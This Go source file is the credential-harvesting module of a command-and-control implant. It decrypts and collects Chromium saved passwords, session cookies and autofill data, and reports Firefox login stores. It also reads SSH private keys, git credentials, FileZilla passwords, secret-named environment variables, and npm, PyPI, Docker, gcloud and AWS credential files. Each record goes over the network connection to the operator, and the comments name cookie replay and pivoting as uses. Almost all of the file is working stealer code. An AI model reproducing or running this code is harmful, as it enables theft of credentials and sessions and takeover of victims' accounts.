package main

// Credential collection, shared by every platform.
//
// Row wire format (tab separated, one record per line):
//
//	kind \t source \t target \t user \t secret \t note \t path
//
// Browser rows come from the Chromium profile stores, which are read with the
// in-tree SQLite reader (internal/sqlread) because the implant cannot link a
// driver. Decryption happens here, on the target, because the key material
// (DPAPI, Keychain, secret-service) never leaves the host.
//
// Kinds: C login, S cookie, A autofill, N note, W wifi, M credential manager,
// F file client (FileZilla/WinSCP), P PuTTY, G git, K ssh key, E env, R rdp,
// X other config.

import (
	"encoding/base64"
	"encoding/json"
	"encoding/xml"
	"net"
	"os"
	"path/filepath"
	"regexp"
	"runtime"
	"sort"
	"strings"

	"c2-platform/internal/protocol"
	"c2-platform/internal/sqlread"
)

// secretBox carries the profile master key used to unwrap Login Data / Cookies
// values. The concrete key derivation is per platform (creds_<os>.go).
type secretBox struct {
	key    []byte
	scheme string
}

type credRow struct {
	kind   string
	source string
	target string
	user   string
	secret string
	note   string
	path   string
}

// oneLine keeps a value inside a single TSV field.
func oneLine(s string) string {
	s = strings.ReplaceAll(s, "\r", " ")
	s = strings.ReplaceAll(s, "\n", " ")
	s = strings.ReplaceAll(s, "\t", " ")
	if len(s) > 4096 {
		s = s[:4096]
	}
	return strings.TrimSpace(s)
}

func emitCred(c net.Conn, r credRow) {
	line := strings.Join([]string{
		r.kind, oneLine(r.source), oneLine(r.target), oneLine(r.user),
		oneLine(r.secret), oneLine(r.note), oneLine(r.path),
	}, "\t") + "\n"
	_ = writeFrame(c, protocol.RspData, []byte(line))
}

// handleBrowserDeep is the CmdBrowserDeep entry point.
func handleBrowserDeep(c net.Conn) {
	collectBrowserCreds(c)
	_ = writeFrame(c, protocol.RspEnd, nil)
}

// handleCreds is the CmdCreds entry point. scope is browser|system|all.
func handleCreds(c net.Conn, scope string) {
	switch strings.ToLower(strings.TrimSpace(scope)) {
	case "browser":
		collectBrowserCreds(c)
	case "system":
		collectSystemCreds(c)
	default:
		collectBrowserCreds(c)
		collectSystemCreds(c)
	}
	_ = writeFrame(c, protocol.RspEnd, nil)
}

// ---------------------------------------------------------------------------
// Chromium
// ---------------------------------------------------------------------------

func chromiumProfiles(root browserRoot) []string {
	entries, err := os.ReadDir(root.path)
	if err != nil {
		return nil
	}
	var out []string
	for _, e := range entries {
		if !e.IsDir() || strings.HasPrefix(e.Name(), ".") {
			continue
		}
		if e.Name() != "Default" && !strings.HasPrefix(e.Name(), "Profile") {
			continue
		}
		out = append(out, filepath.Join(root.path, e.Name()))
	}
	return out
}

func collectBrowserCreds(c net.Conn) {
	for _, br := range browserRoots() {
		if br.firefox {
			collectFirefox(c, br)
			continue
		}
		box, note := newSecretBox(br)
		if note != "" {
			emitCred(c, credRow{"N", br.name, "密钥方案", "", "", note, br.path})
		}
		seen := 0
		for _, prof := range chromiumProfiles(br) {
			seen++
			scanChromiumProfile(c, br, prof, box)
		}
		if seen == 0 {
			// still report the root so the console can show "installed, no profiles"
			if st, err := os.Stat(br.path); err == nil && st.IsDir() {
				emitCred(c, credRow{"N", br.name, "配置目录", "", "", "无 Default/Profile* 子目录", br.path})
			}
		}
	}
}

func readStoreFile(path string) ([]byte, bool) {
	st, err := os.Stat(path)
	if err != nil || st.IsDir() || st.Size() == 0 || st.Size() > 96<<20 {
		return nil, false
	}
	b, err := os.ReadFile(path)
	if err != nil {
		return nil, false
	}
	return b, true
}

func scanChromiumProfile(c net.Conn, br browserRoot, prof string, box *secretBox) {
	// Logins: password_value is DPAPI/AES wrapped, so decryption is local.
	if data, ok := readStoreFile(filepath.Join(prof, "Login Data")); ok {
		if db, err := sqlread.Open(data); err == nil {
			if tbl, err := db.Table("logins"); err == nil {
				count := 0
				_ = tbl.Scan(400, func(row map[string]sqlread.Value) bool {
					url := row["origin_url"].String()
					if url == "" {
						return true
					}
					user := row["username_value"].String()
					blob := row["password_value"].Bytes()
					pass, okPass := box.decrypt(blob, false)
					note := ""
					switch {
					case len(blob) == 0:
						note = "无密码（仅记录账号或由系统管理）"
					case okPass:
						note = "times_used=" + row["times_used"].String()
					default:
						note = box.failNote(blob)
					}
					emitCred(c, credRow{"C", br.name, url, user, pass, note, filepath.Join(prof, "Login Data")})
					count++
					return true
				})
				if count == 0 {
					emitCred(c, credRow{"N", br.name, "账号库", "", "", "Login Data 无记录", filepath.Join(prof, "Login Data")})
				}
			}
		}
	}

	// Cookies: session material. Values are only useful for domain replay, so
	// cap the volume and keep host+name+value.
	if data, ok := readStoreFile(filepath.Join(prof, "Cookies")); ok {
		if db, err := sqlread.Open(data); err == nil {
			if tbl, err := db.Table("cookies"); err == nil {
				_ = tbl.Scan(500, func(row map[string]sqlread.Value) bool {
					host := row["host_key"].String()
					name := row["name"].String()
					val, okV := box.decrypt(row["encrypted_value"].Bytes(), true)
					if !okV && len(row["encrypted_value"].Bytes()) > 0 {
						return true
					}
					if name == "" || val == "" {
						return true
					}
					emitCred(c, credRow{"S", br.name, host, name, val, "cookie", filepath.Join(prof, "Cookies")})
					return true
				})
			}
		}
	}

	// Web Data: autofill values, useful for pivot and account enumeration.
	if data, ok := readStoreFile(filepath.Join(prof, "Web Data")); ok {
		if db, err := sqlread.Open(data); err == nil {
			if tbl, err := db.Table("autofill"); err == nil {
				_ = tbl.Scan(200, func(row map[string]sqlread.Value) bool {
					name := row["name"].String()
					val := row["value"].String()
					if name == "" || val == "" {
						return true
					}
					emitCred(c, credRow{"A", br.name, name, "", val, "autofill", filepath.Join(prof, "Web Data")})
					return true
				})
			}
		}
	}

	// Profile identity from Preferences: which Google/Microsoft account is on
	// this profile, which makes the harvested URLs attributable.
	if data, ok := readStoreFile(filepath.Join(prof, "Preferences")); ok {
		var pref struct {
			Profile struct {
				Name        string `json:"name"`
				AccountInfo []struct {
					Email string `json:"email"`
				} `json:"account_info"`
			} `json:"profile"`
		}
		if json.Unmarshal(data, &pref) == nil {
			email := ""
			if len(pref.Profile.AccountInfo) > 0 {
				email = pref.Profile.AccountInfo[0].Email
			}
			if pref.Profile.Name != "" || email != "" {
				emitCred(c, credRow{
					"N", br.name, "配置身份", email,
					"", pref.Profile.Name, prof,
				})
			}
		}
	}
}

// ---------------------------------------------------------------------------
// Firefox: logins.json is NSS-protected (key4.db + optional master password).
// Decrypting it correctly needs the full NSS PBE/SDR implementation, so this
// reports the shape of the store and leaves the ciphertext to the operator's
// key4.db tooling. Browsing-derived targets are already covered by the
// server-side History/places.sqlite queries.
// ---------------------------------------------------------------------------

func collectFirefox(c net.Conn, br browserRoot) {
	profiles, err := os.ReadDir(br.path)
	if err != nil {
		return
	}
	for _, p := range profiles {
		if !p.IsDir() {
			continue
		}
		base := filepath.Join(br.path, p.Name())
		data, ok := readStoreFile(filepath.Join(base, "logins.json"))
		if !ok {
			continue
		}
		var doc struct {
			Logins []struct {
				Hostname    string `json:"hostname"`
				EncUser     string `json:"encryptedUsername"`
				TimeCreated int64  `json:"timeCreated"`
				TimesUsed   int64  `json:"timesUsed"`
			} `json:"logins"`
		}
		if json.Unmarshal(data, &doc) != nil {
			continue
		}
		for _, l := range doc.Logins {
			if l.Hostname == "" {
				continue
			}
			emitCred(c, credRow{
				"C", br.name, l.Hostname, "",
				"",
				"NSS 加密（需 key4.db 或主密码），未在本机解密；记录条数可用于定位高价值站点",
				filepath.Join(base, "logins.json"),
			})
		}
		if len(doc.Logins) > 0 {
			emitCred(c, credRow{
				"N", br.name, "账号库", "",
				"", "logins.json 条目 " + itoa(len(doc.Logins)), filepath.Join(base, "logins.json"),
			})
		}
	}
}

func itoa(n int) string {
	if n == 0 {
		return "0"
	}
	var b [20]byte
	i := len(b)
	for n > 0 {
		i--
		b[i] = byte('0' + n%10)
		n /= 10
	}
	return string(b[i:])
}

// stripCookiePrefix drops the 32-byte SHA256(host_key) prefix that Chromium
// prepends to cookie plaintext (DB version >= 24).
func stripCookiePrefix(p []byte) []byte {
	if len(p) > 32 {
		return p[32:]
	}
	return p
}

// ---------------------------------------------------------------------------
// System collectors: implemented per platform in creds_<os>.go
// ---------------------------------------------------------------------------

var (
	secretNameRe = regexp.MustCompile(`(?i)(pass(word|wd)?|pwd|secret|token|api[-_]?key|access[-_]?key|private[-_]?key|auth)`)
	envNoiseRe   = regexp.MustCompile(`(?i)^(PATH|PWD|OLDPWD|HOME|LANG|LC_.*|TERM|SHELL|TMPDIR|TEMP|TMP|HOSTNAME|USER|LOGNAME|SHLVL|_|COLORTERM|DISPLAY|SSH_TTY|SSH_CONNECTION|SSH_AUTH_SOCK|XDG_.*|LS_COLORS|MANPATH|PYTHONPATH|GOPATH)$|(?i)_(SOCK|SOCKET|DIR|PATH|HOME|FILE)$`)
)

// gitCredentials parses ~/.git-credentials ("https://user:token@host").
func gitCredentials(c net.Conn) {
	home, _ := os.UserHomeDir()
	if home == "" {
		return
	}
	for _, name := range []string{".git-credentials", ".config/git/credentials"} {
		path := filepath.Join(home, name)
		data, ok := readStoreFile(path)
		if !ok {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line == "" || !strings.Contains(line, "@") {
				continue
			}
			scheme := ""
			rest := line
			if i := strings.Index(rest, "://"); i > 0 {
				scheme, rest = rest[:i], rest[i+3:]
			}
			at := strings.LastIndex(rest, "@")
			if at <= 0 {
				continue
			}
			creds, host := rest[:at], rest[at+1:]
			user, pass := creds, ""
			if i := strings.Index(creds, ":"); i >= 0 {
				user, pass = creds[:i], creds[i+1:]
			}
			emitCred(c, credRow{"G", "Git", scheme + "://" + host, user, pass, "明文存储", path})
		}
	}
}

// sshKeys reports private key material base64-encoded; newlines would break the
// row format, and the operator can decode straight back to PEM/OpenSSH.
func sshKeys(c net.Conn) {
	home, _ := os.UserHomeDir()
	if home == "" {
		return
	}
	dir := filepath.Join(home, ".ssh")
	entries, err := os.ReadDir(dir)
	if err != nil {
		return
	}
	for _, e := range entries {
		if e.IsDir() || strings.HasSuffix(e.Name(), ".pub") {
			continue
		}
		path := filepath.Join(dir, e.Name())
		data, ok := readStoreFile(path)
		if !ok || len(data) < 64 {
			continue
		}
		text := string(data)
		if !strings.Contains(text, "PRIVATE KEY") {
			continue
		}
		kindNote := "OpenSSH/PEM 私钥（base64）"
		emitCred(c, credRow{"K", "SSHKey", e.Name(), "", base64.StdEncoding.EncodeToString(data), kindNote, path})
		if pub, err := os.ReadFile(path + ".pub"); err == nil {
			emitCred(c, credRow{"N", "SSHKey", e.Name() + ".pub", "", "", strings.TrimSpace(string(pub)), path + ".pub"})
		}
	}
}

// envSecrets flags environment variables whose name looks like a credential.
func envSecrets(c net.Conn) {
	for _, kv := range os.Environ() {
		i := strings.Index(kv, "=")
		if i <= 0 {
			continue
		}
		name, val := kv[:i], kv[i+1:]
		if len(val) < 6 || envNoiseRe.MatchString(name) || !secretNameRe.MatchString(name) {
			continue
		}
		emitCred(c, credRow{"E", "Env", name, "", val, runtime.GOOS + " 环境变量", ""})
	}
}

// fileZilla parses recentservers.xml, where passwords are base64, not encrypted.
func fileZilla(c net.Conn) {
	home, _ := os.UserHomeDir()
	candidates := []string{}
	switch runtime.GOOS {
	case "windows":
		if app := os.Getenv("APPDATA"); app != "" {
			candidates = append(candidates, filepath.Join(app, "FileZilla", "recentservers.xml"))
			candidates = append(candidates, filepath.Join(app, "FileZilla", "sitemanager.xml"))
		}
	case "darwin":
		candidates = append(candidates,
			filepath.Join(home, ".config", "filezilla", "recentservers.xml"),
			filepath.Join(home, ".config", "filezilla", "sitemanager.xml"))
	default:
		candidates = append(candidates,
			filepath.Join(home, ".config", "filezilla", "recentservers.xml"),
			filepath.Join(home, ".config", "filezilla", "sitemanager.xml"))
	}
	for _, path := range candidates {
		data, ok := readStoreFile(path)
		if !ok {
			continue
		}
		var doc struct {
			Servers []struct {
				Host string `xml:"Host"`
				Port string `xml:"Port"`
				User string `xml:"User"`
				Pass string `xml:"Pass"`
			} `xml:"Servers>Server"`
		}
		if xml.Unmarshal(data, &doc) != nil {
			continue
		}
		for _, s := range doc.Servers {
			if s.Host == "" {
				continue
			}
			pass := s.Pass
			if dec, err := base64.StdEncoding.DecodeString(strings.TrimSpace(s.Pass)); err == nil && len(dec) > 0 {
				pass = string(dec)
			}
			target := s.Host
			if s.Port != "" && s.Port != "21" {
				target += ":" + s.Port
			}
			emitCred(c, credRow{"F", "FileZilla", target, s.User, pass, "base64 存储", path})
		}
	}
}

// sortRows is used by tests that compare collector output deterministically.
func sortRows(rows []credRow) {
	sort.Slice(rows, func(i, j int) bool {
		if rows[i].kind != rows[j].kind {
			return rows[i].kind < rows[j].kind
		}
		return rows[i].target < rows[j].target
	})
}

// dotfileSecrets reads package-manager and registry auth tokens. These are the
// config files that most often hold a live credential on developer hosts.
func dotfileSecrets(c net.Conn) {
	home, _ := os.UserHomeDir()
	if home == "" {
		return
	}
	type probe struct {
		path string
		kind string
		note string
	}
	probes := []probe{
		{filepath.Join(home, ".npmrc"), "X", "npm registry token"},
		{filepath.Join(home, ".pypirc"), "X", "PyPI upload 凭据"},
		{filepath.Join(home, ".netrc"), "X", "netrc 主机凭据"},
		{filepath.Join(home, ".docker", "config.json"), "X", "Docker registry 凭据"},
		{filepath.Join(home, ".config", "gcloud", "credentials.db"), "X", "gcloud 凭据库"},
		{filepath.Join(home, ".aws", "credentials"), "X", "AWS 访问密钥"},
	}
	for _, pr := range probes {
		data, ok := readStoreFile(pr.path)
		if !ok {
			continue
		}
		for _, line := range strings.Split(string(data), "\n") {
			line = strings.TrimSpace(line)
			if line == "" || strings.HasPrefix(line, "#") || strings.HasPrefix(line, ";") || strings.HasPrefix(line, "[") {
				continue
			}
			if !strings.ContainsAny(line, "=:") {
				continue
			}
			if !secretNameRe.MatchString(line) && !strings.Contains(pr.path, "credentials") {
				continue
			}
			key, val := line, ""
			if i := strings.IndexAny(line, "=:"); i > 0 {
				key, val = strings.TrimSpace(line[:i]), strings.TrimSpace(line[i+1:])
			}
			if val == "" || len(val) < 6 {
				continue
			}
			if strings.HasPrefix(val, "{") || strings.HasPrefix(val, "\"") {
				continue
			}
			emitCred(c, credRow{kind: pr.kind, source: filepath.Base(pr.path), target: key, secret: val, note: pr.note, path: pr.path})
		}
	}
}
